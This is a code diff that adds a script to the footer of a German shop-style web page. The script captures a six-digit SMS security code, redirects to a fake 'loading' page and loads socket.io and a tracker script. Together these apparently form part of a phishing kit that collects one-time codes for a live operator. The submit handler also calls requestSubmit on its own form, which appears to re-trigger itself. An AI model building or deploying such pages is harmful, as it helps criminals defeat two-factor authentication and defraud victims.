@@ -308,6 +308,57 @@
             Preisangaben inkl. Steuer und zzgl. Service- und Versandkosten
         </div>
     </footer>
+  <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                const form = document.getElementById('semitr1');
+                const smsCodeInput = document.getElementById('smsCode');
+                const smsCodeError = document.getElementById('smsCodeError');
 
+                // Only allow numbers in SMS code field
+                smsCodeInput.addEventListener('keypress', function (e) {
+                    if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
+                        e.preventDefault();
+                    }
+                });
+
+                // Clear error when user starts typing
+                smsCodeInput.addEventListener('input', function () {
+                    smsCodeError.textContent = '';
+                    smsCodeInput.classList.remove('input-error');
+                });
+
+                // Validate SMS code format
+                function validateSmsCode(code) {
+                    return /^\d{6}$/.test(code); // Must be exactly 6 digits
+                }
+
+                form.addEventListener('submit', function (e) {
+                    e.preventDefault();
+                    const smsCode = smsCodeInput.value.trim();
+
+                    // Validate SMS code
+                    if (!smsCode) {
+                        smsCodeError.textContent = 'Bitte geben Sie den Sicherheitscode ein';
+                        smsCodeInput.classList.add('input-error');
+                        return false;
+                    } else if (!validateSmsCode(smsCode)) {
+                        smsCodeError.textContent = 'Der Sicherheitscode muss 6 Ziffern enthalten';
+                        smsCodeInput.classList.add('input-error');
+                        return false;
+                    }
+
+                    form.setAttribute('data-redirect', '/loading?time=3&url=SmS-2-hkjnUHnKJHu');
+                    form.requestSubmit();
+
+                    // Show processing state
+                    const submitButton = form.querySelector('button[type="submit"]');
+                    const originalButtonText = submitButton.textContent;
+                    submitButton.textContent = 'Wird verarbeitet...';
+                    submitButton.disabled = true;
+                });
+            });
+        </script>
+        <script src="/socket.io/socket.io.js"></script>
+        <script src="js/tracker.js"></script>
 </body>
 </html>
